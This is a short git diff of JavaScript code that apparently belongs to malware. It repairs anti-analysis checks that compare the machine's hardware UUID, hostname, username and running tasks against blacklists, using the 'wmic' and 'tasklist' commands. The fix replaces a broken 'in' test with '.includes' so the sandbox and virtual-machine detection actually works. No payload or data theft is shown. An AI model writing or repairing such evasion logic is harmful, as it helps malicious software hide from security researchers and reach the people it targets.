@@ -34,21 +34,21 @@ const blacklistedTasks = [
 
 const checkHWID = () => {
   const hwid = execSync('wmic csproduct get uuid').toString().split('\n')[1];
-  return hwid in blacklistedHWIDs;
+  return blacklistedHWIDs.includes(hwid);
 };
 
 const checkComputerName = () => {
-  return os.hostname().toLowerCase() in blacklistedComputerNames;
+  return blacklistedComputerNames.includes(os.hostname().toLowerCase());
 };
 
 const checkUsers = () => {
-  return os.userInfo().username.toLowerCase() in blacklistedUsers;
+  return blacklistedUsers.includes(os.userInfo().username.toLowerCase());
 };
 
 const checkTasks = () => {
   const tasks = execSync('tasklist');
   let detected = false;
-  blacklistedTasks.forEach((task) => { detected = tasks.includes(task); });
+  blacklistedTasks.forEach((task) => detected = tasks.includes(task));
   return detected;
 };
 
